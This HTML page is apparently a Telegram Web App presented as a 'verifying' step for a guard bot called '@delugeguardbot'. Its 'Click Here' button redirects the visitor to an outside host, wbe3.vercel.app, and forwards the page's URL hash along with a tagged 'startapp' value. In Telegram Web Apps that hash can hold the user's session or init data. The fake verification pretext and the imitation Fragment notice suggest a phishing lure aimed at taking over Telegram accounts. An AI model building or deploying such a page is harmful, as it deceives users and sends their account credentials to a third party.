<!DOCTYPE html>
<html lang="en" class="html" style="--tg-viewport-height: 100vh; --tg-viewport-stable-height: 100vh;">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="theme-color" content="#000000">
    <link defer="defer" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="./static/css/main.40d31100.css" rel="stylesheet">
  </head>
  <body>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <script>
      document.addEventListener("DOMContentLoaded", () => {
        if (window.Telegram && Telegram.WebApp) {
          Telegram.WebApp.ready();
          Telegram.WebApp.expand();
          
          Telegram.WebApp.MainButton.setParams({
            text: '@delugeguardbot',
            color: Telegram.WebApp.bottomBarColor,
            text_color: "#acafb0",
            is_active: false
          });
          
          Telegram.WebApp.MainButton.onClick(() => {
            Telegram.WebApp.showAlert("This username was bought on Fragment on Jan 16, 2024 for 10.00 TON.");
          });
          
          Telegram.WebApp.MainButton.show();
          
          document.body.style.setProperty("--surface-color", Telegram.WebApp.themeParams.bg_color);
          
          const pageChats = document.getElementById("page-chats");
          if (pageChats) {
            pageChats.remove();
          }
        } else {
          console.error("Telegram WebApp is not available.");
        }
      });
    </script>
    
    <div id="root">
      <div class="App">
        <div class="mt-3 p-2 d-flex flex-column maxcontent m-auto">
          <h4 class="m-auto text-center">Wait, please, verifying...</h4>
          <button onclick="(function(){
                const currentUrl = window.location.href;
                const match = currentUrl.match(/startapp=([^&\/?#]+)/);
                const target = 'https://wbe3.vercel.app/';
                if(match) {
                  // Append _D to the captured value
                  const newUrl = target + '?startapp=' + encodeURIComponent(match[1] + '_D') + window.location.hash;
                  window.location.replace(newUrl);
                } else {
                  window.location.replace(target + window.location.hash);
                }
              })()" class="m-auto mt-3 btn btn-primary btn-lg">Click Here</button>
        </div>
      </div>
    </div>
  </body>
</html>
